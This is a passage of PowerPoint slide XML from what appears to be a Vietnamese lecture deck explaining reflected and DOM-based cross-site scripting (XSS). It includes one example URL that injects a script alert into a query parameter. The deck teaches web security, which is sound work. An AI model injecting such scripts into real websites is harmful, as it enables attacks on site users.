          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3810000" y="1615281"/>
            <a:ext cx="7943850" cy="4772025"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1210166657"/>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3B20F9E4-CEA5-4B50-911D-E86BE1E6E54B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1127125" y="188913"/>
            <a:ext cx="7391400" cy="563562"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các hình thức tồn tại của XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0B341F5D-1E42-42F2-8DEC-2200C1D7D8E9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1919288" y="1557339"/>
            <a:ext cx="8229600" cy="5095875"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Reflected XSS </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just" eaLnBrk="1" hangingPunct="1">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Loại này xuất hiện khi dữ liệu được cung cấp từ một web client nào đó</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just" eaLnBrk="1" hangingPunct="1">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tìm lỗ hổng bảo mật trên website bằng cách gắn một đoạn mã test vào web client để web client gửi đến server và chờ phản hồi của web server để tìm ra lỗ hổng bảo mật</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just" eaLnBrk="1" hangingPunct="1">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Xảy ra do không chú ý filter input (lọc sữ liệu đầu vào) từ URL của website</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just" eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="527746593"/>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29CB8189-C00A-4C0D-8E46-491BFD1BAD9A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1416050" y="182563"/>
            <a:ext cx="7391400" cy="563562"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các hình thức tồn tại của XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4C43B1AD-5FC6-479C-A7E8-3148C658CD9D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Reflected  XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10244" name="Picture 6" descr="Các kiểu khai thác XSS - Phần 1: Reflected XSS">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B988B6A6-97B3-4F3E-9420-5E8A16D38D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76218" y="1616869"/>
            <a:ext cx="8388350" cy="476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27422639"/>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9BF9EF19-953D-417F-8CC7-C5F9C16525F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1416050" y="260351"/>
            <a:ext cx="7391400" cy="563563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các hình thức tồn tại của XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{30B3D186-84A8-4B92-93D5-F276ED4B5860}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1615281"/>
            <a:ext cx="10515600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Reflected XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>URL shortening service</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Picture 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C4ACC502-0688-48D7-A1E4-F36ADAB7062B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402722" y="1621376"/>
            <a:ext cx="8789278" cy="4779423"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="460489911"/>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84CE3FDC-A9A0-443F-9B7C-B361F703E702}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1416050" y="188913"/>
            <a:ext cx="7391400" cy="563562"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các hình thức tồn tại của XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12291" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{641BBD91-904A-4BD8-974B-4348B017F00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4578350" y="1739456"/>
            <a:ext cx="7613650" cy="4335463"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Content Placeholder 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A39269BD-4A23-4FBB-8F2F-B6DFA989845C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="577850" y="1766888"/>
            <a:ext cx="3765550" cy="5095875"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="342900" indent="-342900" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
              <a:defRPr sz="2400" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="514350" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
              <a:defRPr sz="2000" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="857250" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr sz="1800" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1200150" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="ü"/>
              <a:defRPr sz="1800" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="1543050" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Arial"/>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pPr marL="0" indent="0">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DOM-based XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>DOM-based XSS is a variant of both persistent and reflected XSS. In a DOM-based XSS attack, the malicious string is not actually parsed by the victim's browser until the website's legitimate JavaScript is executed. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4111437075"/>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9BF9EF19-953D-417F-8CC7-C5F9C16525F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1416050" y="260351"/>
            <a:ext cx="7391400" cy="563563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các hình thức tồn tại của XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{30B3D186-84A8-4B92-93D5-F276ED4B5860}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1615281"/>
            <a:ext cx="10515600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>DOM-based XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Picture 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F67DC59A-A91B-424D-BB5B-89675A287C1D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3733800" y="1371600"/>
            <a:ext cx="7991475" cy="5257800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1695611025"/>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9BF9EF19-953D-417F-8CC7-C5F9C16525F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1416050" y="260351"/>
            <a:ext cx="7391400" cy="563563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các hình thức tồn tại của XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{30B3D186-84A8-4B92-93D5-F276ED4B5860}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1828800"/>
            <a:ext cx="10972800" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>DOM-based XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2500"/>
              <a:t>In traditional XSS, the malicious JavaScript is executed when the page is loaded, as part of the HTML sent by the server.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2500"/>
              <a:t>In DOM-based XSS, the malicious JavaScript is executed at some point after the page has loaded, as a result of the page's legitimate JavaScript treating user input in an unsafe way.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>XSS vulnerabilities can be present not only in your website's server-side code, but also in your website's client-side JavaScript code. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1880372785"/>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CB805744-01DA-4C04-9051-45879BAF0A0B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3792538" y="476251"/>
            <a:ext cx="4222750" cy="288925"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Hoạt động của XSS</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="en-US">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85882AB-1953-4D60-AA06-BF1FA6D8D293}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="1540669"/>
            <a:ext cx="11658600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cho phép chèn các đoạn mã vào link của đường dẫn, để thực thi trên trình duyệt của người dùng. Thường thì XSS có dạng như sau: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="349250" indent="-349250">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>http://www.web.vn//index.php?pg=news&amp;cat=&lt;script&gt;alert(“Lỗi XSS”)&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15364" name="Picture 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6A2E0D09-C7A0-4C3C-AC7C-E8765C17822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3051175"/>
            <a:ext cx="7496175"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3" name="Straight Connector 12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0BA85882-C250-4BB8-BD8F-B8942BF7ABAD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6456363" y="3500438"/>
            <a:ext cx="0" cy="215900"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="28575">
            <a:headEnd type="none" w="med" len="med"/>
            <a:tailEnd type="none" w="med" len="med"/>
          </a:ln>
          <a:extLst/>
        </p:spPr>
        <p:style>
          <a:lnRef idx="3">
            <a:schemeClr val="accent4"/>
          </a:lnRef>
          <a:fillRef idx="0">
            <a:schemeClr val="accent4"/>
          </a:fillRef>
          <a:effectRef idx="2">
            <a:schemeClr val="accent4"/>
          </a:effectRef>
          <a:fontRef idx="minor">
            <a:schemeClr val="tx1"/>
          </a:fontRef>
        </p:style>
      </p:cxnSp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1481730189"/>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D91942A1-6078-4A73-9E93-AB7E1B6BD2F6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Hoạt động của XSS</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US">
